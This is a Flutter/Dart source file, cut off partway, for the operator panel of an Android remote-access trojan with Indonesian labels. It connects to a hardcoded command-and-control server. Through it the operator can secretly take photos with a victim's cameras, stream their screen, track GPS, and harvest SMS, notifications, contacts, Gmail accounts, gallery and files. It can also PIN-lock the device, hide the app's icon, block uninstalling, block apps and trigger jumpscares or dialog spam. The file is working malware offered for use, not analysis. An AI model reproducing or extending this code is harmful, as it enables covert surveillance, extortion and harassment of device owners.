import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:typed_data';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:file_picker/file_picker.dart';
import 'dart:io';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:webview_flutter/webview_flutter.dart';

const String baseUrl = "http://cp.zyrostore.id:3448";

enum LogType { info, success, warning, error }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;
  LogEntry({required this.timestamp, required this.message, this.type = LogType.info});
}

// ─── LIQUID GLASS THEME ──────────────────────────────────────────────
const Color bgMain = Color(0xFF0A0A0F);
const Color bgSurface = Color(0xFF12121A);
const Color cardColor = Color(0xFF15151F);
const Color textMain = Colors.white;
const Color textSub = Colors.white54;
const Color accentRed = Color(0xFFFF4757);
const Color accentBlue = Color(0xFF4A9EFF);
const Color accentPurple = Color(0xFF9B59FF);
const Color accentCyan = Color(0xFF00E5FF);
const Color borderColor = Color(0xFF2A2A3A);
const Color successColor = Color(0xFF2ED573);
const Color warningColor = Color(0xFFFFA502);
const Color errorColor = Color(0xFFFF4757);

// Glass gradient colors
const Color glassTop = Color(0x22FFFFFF);
const Color glassBottom = Color(0x08FFFFFF);
const Color glassBorder = Color(0x30FFFFFF);

// ─── MAIN PAGE ────────────────────────────────────────────────────────
class ControllerPage extends StatefulWidget {
  final Map<String, dynamic>? device;
  final String? sessionKey;

  const ControllerPage({super.key, this.device, this.sessionKey});

  @override
  State<ControllerPage> createState() => _ControllerPageState();
}

class _ControllerPageState extends State<ControllerPage> with SingleTickerProviderStateMixin {
  // ─── STATE ────────────────────────────────────────────────────────────
  final List<LogEntry> _executionLogs = [];
  late IO.Socket socket;
  bool _isProcessing = false;
  bool _isConnected = false;
  bool _deviceInfoExpanded = true;

  String _targetId = "unknown";
  String _targetModel = "COMMAND CENTER";
  Map<String, dynamic> _deviceData = {};

  // ─── DATA PESAN (SMS & NOTIF) ──────────────────────────────────────
  Map<String, dynamic> _smsData = {};
  Map<String, dynamic> _notifData = {};

  // ─── STREAM CAMERA ──────────────────────────────────────────────────
  final StreamController<String> _cameraFrameStreamController = StreamController<String>.broadcast();

  // ─── CONTROLLERS ──────────────────────────────────────────────────
  final ScrollController _logScrollController = ScrollController();

  // ─── STATE KONTROL ──────────────────────────────────────────────────
  bool _isJumpscareActive = false;
  bool _isJumpscare2Active = false;
  bool _isDialogSpamActive = false;
  bool _isTouchBlocked = false;
  bool _isTtsSpeaking = false;
  bool _isVideoOverlayActive = false;
  bool _isLockCustomActive = false;
  bool _isAntiUninstallActive = false;
  String _jumpscareUrl = '';

  // ─── STATE LOCATION ────────────────────────────────────────────────────
  Map<String, dynamic> _locationData = {};
  BuildContext? _locationLoadingContext;

  String _jumpscare2Url = '';
  int _jumpscare2Duration = 3000;
  List<String> _blockedApps = [];

  // ─── CAMERA & SCREEN MODAL STATE ──────────────────────────────────────
  String _cameraFacing = 'front';
  bool _isWaitingForPhoto = false;
  BuildContext? _photoLoadingContext;

  // ─── GALLERY STATE ──────────────────────────────────────────────────
  List<Map<String, dynamic>> _galleryPhotos = [];
  final StreamController<List<Map<String, dynamic>>> _galleryStreamController =
  StreamController<List<Map<String, dynamic>>>.broadcast();

  // ─── DEKLARASI DI ATAS initState ──────────────────────────────────────
  late List<Map<String, dynamic>> _controlItems;

  // ─── STATE UNTUK BLOCK APP ──────────────────────────────────────────
  List<Map<String, dynamic>> _installedApps = [];

  @override
  void initState() {
    super.initState();
    
    if (widget.device != null) {
      _targetId = widget.device!['id']?.toString() ?? '';
      _targetModel = widget.device!['name'] ?? widget.device!['model'] ?? 'Unknown Device';
      _deviceData = Map<String, dynamic>.from(widget.device!);
    }

    _initSocket();
    _initCameraStream();

    _controlItems = [
      {
        "label": "Lock Screen",
        "icon": Icons.lock_outline,
        "color": accentRed,
        "command": "lockDevice",
        "isToggle": true,
        "isOn": _deviceData['deviceLocked'] ?? false,
        "needsInput": true,
        "subtitle": "Kunci layar target",
      },
      {
        "label": "Custom Lock",
        "icon": Icons.code,
        "color": accentPurple,
        "command": "lockCustom",
        "isToggle": true,
        "isOn": _isLockCustomActive,
        "needsInput": true,
        "subtitle": "Overlay HTML custom",
      },
      {
        "label": "Lock Video",
        "icon": Icons.videocam_outlined,
        "color": accentPurple,
        "command": "videoOverlay",
        "isToggle": true,
        "isOn": _isVideoOverlayActive,
        "needsInput": false,
        "subtitle": "Overlay video fullscreen",
      },
      {
        "label": "Flash",
        "icon": Icons.flash_on,
        "color": warningColor,
        "command": "flashlight",
        "isToggle": true,
        "isOn": _deviceData['flashlight'] ?? false,
        "needsInput": false,
        "subtitle": "Nyalakan flash target",
      },
      {
        "label": "Hide Icon",
        "icon": Icons.visibility_off_outlined,
        "color": warningColor,
        "command": "hideIcon",
        "isToggle": true,
        "isOn": _deviceData['iconHidden'] ?? false,
        "needsInput": false,
        "subtitle": "Sembunyikan icon",
      },
      {
        "label": "Mute",
        "icon": Icons.volume_off_outlined,
        "color": accentRed,
        "command": "muteVolume",
        "isToggle": true,
        "isOn": _deviceData['volumeMuted'] ?? false,
        "needsInput": false,
        "subtitle": "Bisukan suara",
      },
      {
        "label": "Location",
        "icon": Icons.location_on_outlined,
        "color": warningColor,
        "command": "getLocation",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Lacak GPS target",
      },
      {
        "label": "Stuck Layar",
        "icon": Icons.touch_app_outlined,
        "color": warningColor,
        "command": "touchBlock",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Bekukan layar sentuh",
      },
      {
        "label": "TTS",
        "icon": Icons.record_voice_over_outlined,
        "color": accentPurple,
        "command": "ttsSpeak",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Ucapkan teks",
      },
      {
        "label": "Foto Depan",
        "icon": Icons.camera_front_outlined,
        "color": accentBlue,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
        "subtitle": "Kamera depan",
      },
      {
        "label": "Foto Belakang",
        "icon": Icons.camera_rear_outlined,
        "color": accentBlue,
        "command": "camera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
        "subtitle": "Kamera belakang",
      },
      {
        "label": "Live Cam Depan",
        "icon": Icons.videocam_outlined,
        "color": accentBlue,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "front",
        "subtitle": "Stream kamera depan",
      },
      {
        "label": "Live Cam Belakang",
        "icon": Icons.videocam_outlined,
        "color": accentBlue,
        "command": "liveCamera",
        "isToggle": false,
        "needsInput": false,
        "extra": "back",
        "subtitle": "Stream kamera belakang",
      },
      {
        "label": "Stop Camera",
        "icon": Icons.stop_circle_outlined,
        "color": accentRed,
        "command": "stopCamera",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Hentikan kamera",
      },
      {
        "label": "Stop Screen",
        "icon": Icons.stop_screen_share_outlined,
        "color": accentRed,
        "command": "stopScreen",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Hentikan live screen",
      },
      {
        "label": "Vibrate",
        "icon": Icons.vibration,
        "color": textSub,
        "command": "vibrate",
        "isToggle": false,
        "needsInput": false,
        "extra": "500",
        "subtitle": "Getarkan target",
      },
      {
        "label": "Toast",
        "icon": Icons.message_outlined,
        "color": warningColor,
        "command": "showToast",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Tampilkan toast",
      },
      {
        "label": "Spam Dialog",
        "icon": Icons.chat_outlined,
        "color": accentRed,
        "command": "dialogSpam",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Spam dialog",
      },
      {
        "label": "Block App",
        "icon": Icons.block,
        "color": accentRed,
        "command": "blockApp",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Blokir aplikasi",
      },
      {
        "label": "Unblock App",
        "icon": Icons.check_circle_outline,
        "color": successColor,
        "command": "unblockApp",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Buka blokir",
      },
      {
        "label": "Unblock All",
        "icon": Icons.check_circle_outline,
        "color": successColor,
        "command": "unblockAll",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Buka semua blokir",
      },
      {
        "label": "Theme",
        "icon": Icons.color_lens_outlined,
        "color": successColor,
        "command": "changeTheme",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Ganti tema",
      },
      {
        "label": "Live Screen",
        "icon": Icons.screen_share_outlined,
        "color": accentBlue,
        "command": "screen",
        "isToggle": false,
        "needsInput": false,
        "extra": "start",
        "subtitle": "Lihat layar target",
      },
      {
        "label": "Phone",
        "icon": Icons.phone_android_outlined,
        "color": accentCyan,
        "command": "getPhone",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Info SIM",
      },
      {
        "label": "Gmail",
        "icon": Icons.email_outlined,
        "color": accentRed,
        "command": "getGmail",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Akun Gmail",
      },
      {
        "label": "Kontak",
        "icon": Icons.contacts_outlined,
        "color": warningColor,
        "command": "getContacts",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Daftar kontak",
      },
      {
        "label": "Jumpscare",
        "icon": Icons.warning_amber_outlined,
        "color": accentRed,
        "command": "jumpscareStart",
        "isToggle": true,
        "isOn": _isJumpscareActive,
        "needsInput": false,
        "subtitle": "Tampilkan jumpscare",
      },
      {
        "label": "Jumpscare V2",
        "icon": Icons.dangerous_outlined,
        "color": accentRed,
        "command": "jumpscare2Start",
        "isToggle": true,
        "isOn": _isJumpscare2Active,
        "needsInput": false,
        "subtitle": "Jumpscare durasi",
      },
      {
        "label": "Wallpaper",
        "icon": Icons.wallpaper_outlined,
        "color": accentPurple,
        "command": "setWallpaper",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Ganti wallpaper",
      },
      {
        "label": "Open URL",
        "icon": Icons.public_outlined,
        "color": successColor,
        "command": "openUrl",
        "isToggle": false,
        "needsInput": true,
        "subtitle": "Buka URL di target",
      },
      {
        "label": "Galeri",
        "icon": Icons.photo_library_outlined,
        "color": accentBlue,
        "command": "getGallery",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Lihat galeri",
      },
      {
        "label": "File Manager",
        "icon": Icons.folder_open_outlined,
        "color": warningColor,
        "command": "getFiles",
        "isToggle": false,
        "needsInput": false,
        "subtitle": "Jelajahi file",
      },
    ];

    _galleryStreamController.stream.listen((photos) {
      if (mounted) {
        setState(() {
          _galleryPhotos = photos;
        });
        _addLog("🖼️ Gallery update: ${photos.length} foto", LogType.success);
      }
    });
  }

  // ─── SOCKET ──────────────────────────────────────────────────────────
  void _initSocket() {
    try {
      final token = widget.sessionKey ?? '';
      socket = IO.io(
        baseUrl,
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setPath('/socket.io')
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL', 'token': token})
            .enableAutoConnect()
            .build(),
      );

      socket.onConnect((_) {
        if (mounted) {
          setState(() => _isConnected = true);
          _addLog("✅ Terhubung", LogType.success);
          socket.emit('controller:join', { 'token': token });
          _setupSocketListeners();
        }
      });

      socket.onDisconnect((_) {
        if (mounted) setState(() => _isConnected = false);
      });

      socket.connect();
    } catch (e) {
      _addLog("❌ Socket Error: $e", LogType.error);
    }
  }

  void _setupSocketListeners() {
    socket.on('devices:update', (data) {});

    socket.on('device:location', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            _locationData = data;
          });
          _addLog("📍 Location received", LogType.success);
          
          if (_locationLoadingContext != null) {
            try { Navigator.of(_locationLoadingContext!, rootNavigator: true).pop(); } catch (_) {}
            _locationLoadingContext = null;
          }

          Future.delayed(const Duration(milliseconds: 300), () {
            if (mounted) {
              Navigator.of(context, rootNavigator: true).push(
                MaterialPageRoute(
                  builder: (context) => LocationFullscreenPage(
                    targetModel: _targetModel,
                    locationData: _locationData,
                  ),
                  fullscreenDialog: true,
                ),
              );
            }
          });
        }
      }
    });

    socket.on('device:sms', (data) {
      if (data['deviceId'] == _targetId) {
        setState(() {
          _smsData = data;
        });
      }
    });

    socket.on('device:status', (data) {
      if (data['deviceId'] == _targetId) {
        final status = data['status'] as Map? ?? {};
        
        final smsList = status['smsList'];
        if (smsList != null) {
          if (mounted) {
            setState(() {
              _smsData.clear();
              for (var app in smsList) {
                final key = '${app['pkg']}_${app['appName']}';
                _smsData[key] = {
                  'appName': app['appName'],
                  'pkg': app['pkg'],
                  'messages': app['messages'] ?? []
                };
              }
            });
          }
        }

        final notifList = status['notifList'];
        if (notifList != null) {
          if (mounted) {
            setState(() {
              _notifData.clear();
              for (var app in notifList) {
                final key = app['pkg'];
                _notifData[key] = {
                  'appName': app['appName'],
                  'pkg': key,
                  'messages': app['messages'] ?? []
                };
              }
            });
          }
        }
      }
    });

    socket.on('device:notif', (data) {
      if (data['deviceId'] == _targetId) {
        if (mounted) {
          setState(() {
            final notif = data['notif'];
            if (notif != null) {
              final key = notif['pkg'];
              if (!_notifData.containsKey(key)) {
                _notifData[key] = {
                  'appName': notif['appName'],
                  'pkg': key,
                  'messages': []
                };
              }
              final messages = _notifData[key]['messages'] as List;
              final exists = messages.any((x) => 
                x['time'] == notif['time'] && x['text'] == notif['text']);
              if (!exists) {
                messages.insert(0, notif);
              }
            }
          });
        }
      }
    });

    socket.on('camera:frame', (data) {
      if (data['deviceId'] == _targetId && data['frame'] != null) {
        final frame = data['frame'];
        _cameraFrameStreamController.add(frame);

        if (_isWaitingForPhoto) {
          _isWaitingForPhoto = false;
          if (_photoLoadingContext != null) {
            try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
            _photoLoadingContext = null;
          }
          if (mounted) {
            Navigator.push(
              context,
              MaterialPageRoute(
                builder: (context) => ScreenshotResultPage(
                  targetModel: _targetModel,
                  screenshotFrame: frame,
                  screenshotFacing: _cameraFacing,
                  onClose: () {
                    Navigator.pop(context);
                    _sendCommand('camera', extra: 'stop');
                  },
                ),
                fullscreenDialog: true,
              ),
            );
          }
        }
      }
    });

    socket.on('command_response', (data) {
      if (data['deviceId'] == _targetId) {
        final cmd = data['command']?.toString() ?? '';
        final status = data['status']?.toString() ?? '';
        _addLog("📥 $cmd → $status", LogType.info);
        switch (cmd) {
          case 'jumpscareStart': setState(() => _isJumpscareActive = status == 'started'); _updateControlItemState('jumpscareStart', status == 'started'); break;
          case 'jumpscareStop': setState(() => _isJumpscareActive = false); _updateControlItemState('jumpscareStart', false); break;
          case 'jumpscare2Start': setState(() => _isJumpscare2Active = status == 'started'); _updateControlItemState('jumpscare2Start', status == 'started'); break;
          case 'jumpscare2Stop': setState(() => _isJumpscare2Active = false); _updateControlItemState('jumpscare2Start', false); break;
          case 'dialogSpam': setState(() => _isDialogSpamActive = status == 'started'); break;
          case 'dialogSpamStop': setState(() => _isDialogSpamActive = false); break;
          case 'touchBlock': setState(() => _isTouchBlocked = status == 'started'); break;
          case 'touchBlockStop': setState(() => _isTouchBlocked = false); break;
          case 'ttsSpeak': setState(() => _isTtsSpeaking = status == 'started'); break;
          case 'ttsStop': setState(() => _isTtsSpeaking = false); break;
          case 'videoOverlay': setState(() => _isVideoOverlayActive = status == 'started'); break;
          case 'videoOverlayHide': setState(() => _isVideoOverlayActive = false); break;
          case 'lockCustom': setState(() { _isLockCustomActive = status == 'locked'; }); break;
          case 'blockApp': if (data['package'] != null && !_blockedApps.contains(data['package'])) setState(() => _blockedApps.add(data['package'])); break;
          case 'unblockApp': setState(() => _blockedApps.remove(data['package'])); break;
          case 'unblockAll': setState(() => _blockedApps.clear()); break;
          case 'lockDevice': setState(() { _deviceData['deviceLocked'] = true; _updateControlItemState('lockDevice', true); }); break;
          case 'unlockDevice': setState(() { _deviceData['deviceLocked'] = false; _updateControlItemState('lockDevice', false); }); break;
          case 'hideIcon': setState(() { _deviceData['iconHidden'] = data['status'] == 'hidden'; _updateControlItemState('hideIcon', data['status'] == 'hidden'); }); break;
          case 'muteVolume': setState(() { _deviceData['volumeMuted'] = data['status'] == 'muted'; _updateControlItemState('muteVolume', data['status'] == 'muted'); }); break;
          case 'antiUninstall': setState(() { _isAntiUninstallActive = data['status'] == 'active'; }); break;
          case 'flashlight': setState(() { _deviceData['flashlight'] = data['status'] == 'on'; _updateControlItemState('flashlight', data['status'] == 'on'); }); break;
        }
      }
    });

    socket.on('device:phone', (data) {
      if (data['deviceId'] == _targetId) {
        _showPhoneBottomSheet(data);
      }
    });

    socket.on('device:gmail', (data) {
      if (data['deviceId'] == _targetId) {
        _showGmailBottomSheet(data);
      }
    });

    socket.on('device:contacts', (data) {
      if (data['deviceId'] == _targetId) {
        _showContactsBottomSheet(data);
      }
    });

    socket.on('device:apps', (data) {
      if (data['deviceId'] == _targetId) {
        final apps = data['apps'] as List? ?? [];
        setState(() {
          _installedApps = apps.map((app) => Map<String, dynamic>.from(app)).toList();
        });
      }
    });
  }

  void _updateControlItemState(String command, bool value) {
    for (int i = 0; i < _controlItems.length; i++) {
      if (_controlItems[i]['command'] == command) {
        setState(() {
          _controlItems[i]['isOn'] = value;
        });
        break;
      }
    }
  }

  void _initCameraStream() {
    _cameraFrameStreamController.stream.listen((frame) {});
  }

  // ─── LOGGING ──────────────────────────────────────────────────────────
  void _addLog(String message, [LogType type = LogType.info]) {
    if (mounted) {
      setState(() {
        _executionLogs.insert(0, LogEntry(timestamp: DateTime.now(), message: message, type: type));
        if (_executionLogs.length > 100) _executionLogs.removeLast();
      });
    }
  }

  String _formatTime(DateTime time) => "${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}:${time.second.toString().padLeft(2, '0')}";

  Color _getLogColor(LogType type) {
    switch (type) {
      case LogType.success: return successColor;
      case LogType.error: return errorColor;
      case LogType.warning: return warningColor;
      default: return textSub;
    }
  }

  // ─── COMMAND ──────────────────────────────────────────────────────────
  Future<void> _sendCommand(String command, {String? extra}) async {
    if (!_isConnected) {
      _addLog("⚠️ C2 Disconnected", LogType.warning);
      return;
    }
    if (_targetId == "unknown" || _targetId.isEmpty) {
      _addLog("❌ Device ID tidak valid!", LogType.error);
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? widget.sessionKey ?? '';
    if (token.isEmpty) {
      _addLog("❌ Token hilang!", LogType.error);
      return;
    }

    setState(() => _isProcessing = true);
    try {
      final response = await http.post(
        Uri.parse("$baseUrl/api/command/$_targetId"),
        headers: {
          "Content-Type": "application/json",
          "x-auth-token": token,
        },
        body: jsonEncode({
          "command": command,
          "value": extra ?? "",
        }),
      );

      if (response.statusCode == 200) {
        _addLog("🚀 $command", LogType.success);
      } else if (response.statusCode == 401) {
        _addLog("❌ Sesi kadaluarsa!", LogType.error);
      } else {
        _addLog("❌ ERR: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ HTTP ERR: $e", LogType.error);
    } finally {
      if (mounted) setState(() => _isProcessing = false);
    }
  }

  // ─── DIALOG INPUT ────────────────────────────────────────────────────
  Future<String?> _showLockDeviceDialog() async {
    String pin = '';
    String lockTitle = '';
    String errorMessage = '';
    
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => StatefulBuilder(
        builder: (context, setState) => AlertDialog(
          backgroundColor: bgSurface,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(24),
            side: BorderSide(color: glassBorder, width: 1),
          ),
          title: const Text(
            'SET DEVICE LOCK',
            style: TextStyle(color: textMain, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1),
            textAlign: TextAlign.center,
          ),
          content: SingleChildScrollView(
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const SizedBox(height: 8),
                Text(
                  'MASUKKAN PIN & JUDUL LOCK',
                  style: TextStyle(color: textSub, fontSize: 10, letterSpacing: 1),
                  textAlign: TextAlign.center,
                ),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: List.generate(4, (index) {
                    return Container(
                      width: 46,
                      height: 52,
                      margin: const EdgeInsets.symmetric(horizontal: 4),
                      decoration: BoxDecoration(
                        border: Border.all(color: glassBorder, width: 1.5),
                        borderRadius: BorderRadius.circular(12),
                        color: glassTop,
                      ),
                      child: Center(
                        child: Text(
                          index < pin.length ? '●' : '',
                          style: TextStyle(
                            color: accentBlue,
                            fontSize: index < pin.length ? 18 : 22,
                            fontWeight: FontWeight.bold,
                          ),
                        ),
                      ),
                    );
                  }),
                ),
                const SizedBox(height: 16),
                TextField(
                  inputFormatters: [
                    FilteringTextInputFormatter.digitsOnly,
                    LengthLimitingTextInputFormatter(4),
                  ],
                  keyboardType: TextInputType.number,
                  onChanged: (value) => setState(() { pin = value; errorMessage = ''; }),
                  style: const TextStyle(color: Colors.transparent, height: 0.1),
                  decoration: const InputDecoration(border: InputBorder.none),
                  autofocus: true,
                ),
                GridView.count(
                  crossAxisCount: 3,
                  shrinkWrap: true,
                  physics: const NeverScrollableScrollPhysics(),
                  padding: EdgeInsets.zero,
                  mainAxisSpacing: 8,
                  crossAxisSpacing: 8,
                  children: [
                    ...[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) {
                      return _buildKeypadButton('$num', onPressed: () {
                        if (pin.length < 4) setState(() { pin += '$num'; errorMessage = ''; });
                      });
                    }),
                    _buildKeypadButton('⌫', onPressed: () {
                      if (pin.isNotEmpty) setState(() { pin = pin.substring(0, pin.length - 1); errorMessage = ''; });
                    }),
                  ],
                ),
                const SizedBox(height: 12),
                if (errorMessage.isNotEmpty)
                  Text(errorMessage, style: const TextStyle(color: errorColor, fontSize: 10)),
                const SizedBox(height: 8),
                Align(
                  alignment: Alignment.centerLeft,
                  child: Text('JUDUL / PESAN LOCK', style: TextStyle(color: textSub, fontSize: 11)),
                ),
                const SizedBox(height: 8),
                TextField(
                  onChanged: (value) => setState(() => lockTitle = value),
                  maxLength: 60,
                  decoration: InputDecoration(
                    hintText: 'Contoh: Sistem Terkunci...',
                    hintStyle: TextStyle(color: textSub, fontSize: 12),
                    counterText: '',
                    contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                    enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
                    focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
                  ),
                  style: const TextStyle(color: textMain, fontSize: 13),
                ),
              ],
            ),
          ),
          actions: [
            TextButton(
              onPressed: () => Navigator.pop(context, null),
              child: Text("BATAL", style: TextStyle(color: textSub, fontSize: 12)),
            ),
            ElevatedButton(
              onPressed: () {
                if (pin.length != 4) {
                  setState(() => errorMessage = 'PIN harus 4 angka!');
                  return;
                }
                final lockData = jsonEncode({
                  'pin': pin,
                  'title': lockTitle.trim().isEmpty ? 'Perangkat Terkunci' : lockTitle.trim(),
                });
                Navigator.pop(context, lockData);
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: accentBlue,
                foregroundColor: Colors.white,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
              ),
              child: const Text("LOCK", style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],
        ),
      ),
    );
  }

  Future<String?> _showInputDialog({
    required String title,
    required String hint,
    String initialValue = '',
    bool multiline = false,
    TextInputType keyboardType = TextInputType.text,
  }) async {
    final controller = TextEditingController(text: initialValue);
    return showDialog<String>(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: bgSurface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(24),
          side: BorderSide(color: glassBorder, width: 1),
        ),
        title: Text(title, style: const TextStyle(color: textMain, fontSize: 16)),
        content: TextField(
          controller: controller,
          maxLines: multiline ? 10 : 1,
          keyboardType: keyboardType,
          decoration: InputDecoration(
            hintText: hint,
            hintStyle: TextStyle(color: textSub, fontSize: 12),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: glassBorder, width: 1.5), borderRadius: BorderRadius.circular(12)),
            focusedBorder: OutlineInputBorder(borderSide: const BorderSide(color: accentBlue, width: 1.5), borderRadius: BorderRadius.circular(12)),
          ),
          style: const TextStyle(color: textMain, fontSize: 13),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, null),
            child: Text("BATAL", style: TextStyle(color: textSub, fontSize: 12)),
          ),
          ElevatedButton(
            onPressed: () => Navigator.pop(context, controller.text.trim()),
            style: ElevatedButton.styleFrom(
              backgroundColor: accentBlue,
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            ),
            child: const Text("KIRIM", style: TextStyle(fontSize: 12, fontWeight: FontWeight.bold)),
          ),
        ],
      ),
    );
  }

  Widget _buildKeypadButton(String label, {required VoidCallback onPressed}) {
    return GestureDetector(
      onTap: onPressed,
      child: Container(
        decoration: BoxDecoration(
          border: Border.all(color: glassBorder, width: 1.5),
          borderRadius: BorderRadius.circular(12),
          color: glassTop,
        ),
        child: Material(
          color: Colors.transparent,
          child: InkWell(
            onTap: onPressed,
            borderRadius: BorderRadius.circular(12),
            child: Center(
              child: Text(label, style: const TextStyle(color: textMain, fontSize: 18, fontWeight: FontWeight.w600)),
            ),
          ),
        ),
      ),
    );
  }

  // ─── LIQUID GLASS CARD WIDGET ──────────────────────────────────────
  Widget _glassCard({
    required Widget child,
    EdgeInsets? padding,
    Color? borderColor,
    Color? bgColor,
  }) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(20),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Container(
          padding: padding ?? const EdgeInsets.all(16),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                bgColor ?? glassTop,
                bgColor ?? glassBottom,
              ],
            ),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: borderColor ?? glassBorder, width: 1),
          ),
          child: child,
        ),
      ),
    );
  }

  // ─── CONTROL TAB ───────────────────────────────────────────────────
  Widget _buildControlTab() {
    return Container(
      color: bgMain,
      child: SingleChildScrollView(
        padding: const EdgeInsets.all(16),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            _buildDeviceInfoCard(),
            const SizedBox(height: 16),
            _buildTerminalLogs(),
            const SizedBox(height: 20),
            Row(
              children: [
                Container(
                  width: 3,
                  height: 16,
                  decoration: BoxDecoration(
                    color: accentRed,
                    borderRadius: BorderRadius.circular(2),
                  ),
                ),
                const SizedBox(width: 8),
                Text(
                  "REMOTE CONTROL",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 1,
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                  decoration: BoxDecoration(
                    color: _isConnected ? successColor.withOpacity(0.1) : errorColor.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                      color: _isConnected ? successColor.withOpacity(0.3) : errorColor.withOpacity(0.3),
                    ),
                  ),
                  child: Row(
                    children: [
                      Container(
                        width: 5,
                        height: 5,
                        decoration: BoxDecoration(
                          color: _isConnected ? successColor : errorColor,
                          shape: BoxShape.circle,
                        ),
                      ),
                      const SizedBox(width: 4),
                      Text(
                        _isConnected ? "ONLINE" : "OFFLINE",
                        style: TextStyle(
                          color: _isConnected ? successColor : errorColor,
                          fontSize: 8,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 0.5,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),
            const SizedBox(height: 12),
            GridView.builder(
              shrinkWrap: true,
              physics: const NeverScrollableScrollPhysics(),
              gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                crossAxisCount: 2,
                crossAxisSpacing: 10,
                mainAxisSpacing: 10,
                childAspectRatio: 0.92,
              ),
              itemCount: _controlItems.length,
              itemBuilder: (context, index) {
                final item = _controlItems[index];
                return _buildControlCard(item);
              },
            ),
            const SizedBox(height: 24),
            Center(
              child: Text(
                "SECURED • C2 CONNECTED",
                style: TextStyle(color: textSub.withOpacity(0.3), fontSize: 9, letterSpacing: 2),
              ),
            ),
            const SizedBox(height: 40),
          ],
        ),
      ),
    );
  }

  Widget _buildControlCard(Map<String, dynamic> item) {
    final isToggle = item['isToggle'] == true;
    final isOn = item['isOn'] == true;
    final color = item['color'] as Color;

    return ClipRRect(
      borderRadius: BorderRadius.circular(16),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 8, sigmaY: 8),
        child: Container(
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              begin: Alignment.topLeft,
              end: Alignment.bottomRight,
              colors: [
                isOn ? color.withOpacity(0.15) : glassTop,
                isOn ? color.withOpacity(0.05) : glassBottom,
              ],
            ),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(
              color: isOn ? color.withOpacity(0.4) : glassBorder,
              width: 1,
            ),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  Container(
                    padding: const EdgeInsets.all(7),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(8),
                    ),
                    child: Icon(item['icon'], color: color, size: 20),
                  ),
                  const Spacer(),
                  Container(
                    width: 8,
                    height: 8,
                    decoration: BoxDecoration(
                      color: isOn ? color : textSub.withOpacity(0.3),
                      shape: BoxShape.circle,
                      boxShadow: isOn
